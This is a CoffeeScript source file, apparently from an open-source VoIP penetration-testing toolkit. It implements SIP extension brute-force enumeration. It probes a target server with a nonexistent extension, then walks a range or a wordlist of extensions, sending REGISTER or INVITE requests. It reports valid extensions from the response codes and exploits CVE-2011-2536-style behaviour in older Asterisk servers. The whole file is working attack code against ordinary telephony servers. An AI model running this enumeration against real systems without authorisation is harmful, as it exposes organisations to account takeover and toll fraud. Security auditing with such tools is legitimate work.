###

Copyright (C) 2013, Jesus Perez <jesusprubio gmail com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

###


# ---------------------- Requires --------------------------------

{SipMessage} = require "../tools/sipMessage.coffee"
{AsteroidsConn} = require "../tools/asteroidsConn.coffee"
{Parser} = require "../tools/parser.coffee"
{Printer} = require "../tools/printer.coffee"
{Utils} = require "../tools/utils.coffee"
{Grammar} = require "../tools/grammar"
fs = require "fs"


# ----------------------- Class ----------------------------------

# This class includes one function which  sends a valid SIP request and parse
# the response looking for a string with "User-Agent:", "Server:" or
# "Organization" to get info about the SIP service which running on the target.
exports.SipBruteExt =
class SipBruteExt

	printIsVuln = (vuln) ->
		if vuln
			Printer.highlight "\nThe target could be vulnerable to this vector\n"
		else
			Printer.highlight "\nThe target seems NOT to be vulnerable to this vector\n"


	oneEnum = (target, port, path, srcHost, transport, type, testExt) ->
		lport = Utils.randomPort()
		msgObj = new SipMessage type, "", target, port, srcHost, lport, testExt, "", transport, "", "", "", false, "", "", "", "", "", ""

		msgSend = (String) msgObj.create()
		conn = new AsteroidsConn target, port, path, transport, lport
		firstResponse = true

		conn.on "newMessage", (stream) ->
			# TODO: We need to be more polited here, an ACK and BYE is needed
			# to avoid loops.
			if firstResponse
				firstResponse = false
				code = Parser.parseCode stream
				if type is "REGISTER"
					switch code
						when "401", "407"
							Printer.printEnum testExt, "Auth"
						when "200"
							Printer.printEnum testExt, "Open"
						else
							Printer.highlight "Last tested (not valid) extension "
							Printer.normal "\"#{testExt}\"\n"
							Printer.removeCursor()
				else
					switch code
						when "401"
							Printer.printEnum testExt, ""
						else
							Printer.highlight "Last tested (not valid) extension "
							Printer.normal "\"#{testExt}\"\n"
							Printer.removeCursor()

		conn.on "error", (error) ->
			Printer.error "SipBruteExt: #{error}"

		conn.send msgSend


	doEnum = (target, port, path, srcHost, transport, type, rangeExt, delay) ->
		# Extension range.
		if (Grammar.extRangeRE.exec rangeExt)
			rangeExtParsed = Parser.parseExtRange rangeExt
			doLoopNum = (i) =>
				setTimeout(=>
					oneEnum target, port, path, srcHost, transport, type, i
					if i < rangeExtParsed.maxExt
						doLoopNum(parseInt(i, 10) + 1)
				,delay);
			doLoopNum rangeExtParsed.minExt
		# File with extensions.
		else
			if (Grammar.fileRE.exec rangeExt)
				fs.readFile rangeExt, (err, data) ->
					if err
						Printer.error "sipBruteExt: #{err}"
					else
						extensions = data
						splitData = data.toString().split("\n")
						doLoopString = (i) =>
							setTimeout(=>
								oneEnum target, port, path, srcHost, transport, type, splitData[i]
								if i < splitData.length - 1
									doLoopString(i + 1)
							,delay);
						doLoopString 0
			else
				oneEnum target, port, path, srcHost, transport, type, rangeExt


	@run = (target, port, path, srcHost, transport, type, rangeExt, delay) ->

		# Needed to work with Node module net.isIPv6 function.
		if (/:/.test target)
			target = Utils.normalize6 target

		# This extension ("olakase") is impossible to exist.
		lport = Utils.randomPort()
		# First request to see if the server could be vulnerable
		msgObj = new SipMessage type, "", target, port, srcHost, lport, "olakease", "", transport, "", "", "", false, "", "", "", "", "", ""
		msgSend = (String) msgObj.create()
		conn = new AsteroidsConn target, port, path, transport, lport
		conn.send msgSend
		goodResponse = false

		conn.on "newMessage", (stream) ->
			code = Parser.parseCode(stream)
			# First request parsing.
			if not goodResponse
				if type is "REGISTER"
					# CVE-2011-2536, it works if the server has alwaysauthreject=no,
					# which is the default in old Asterisk versions.
					# http://downloads.asterisk.org/pub/security/AST-2009-003.html
					# http://downloads.asterisk.org/pub/security/AST-2011-011.html
					if code in ["401","407"]
						printIsVuln false
						goodResponse = true
					else
						if code is "404"
							goodResponse = true
							printIsVuln true
							doEnum target, port, path, srcHost, transport, type, rangeExt, delay
				else # if INVITE
					# No CVE, some links:
					# http://packetstormsecurity.com/search/?q=francesco+tornieri+SIP+User+Enumeration&s=files
					# Still not implemented: http://packetstormsecurity.com/files/100515/Asterisk-1.4.x-1.6.x-Username-Enumeration.html
					if code in ["100","407","404","484"]
						goodResponse = true
						printIsVuln true
						doEnum target, port, path, srcHost, transport, type, rangeExt, delay
					# else
					# 	printIsVuln false

		conn.on 'error', (error) ->
			Printer.error "SipBruteExt: #{error}"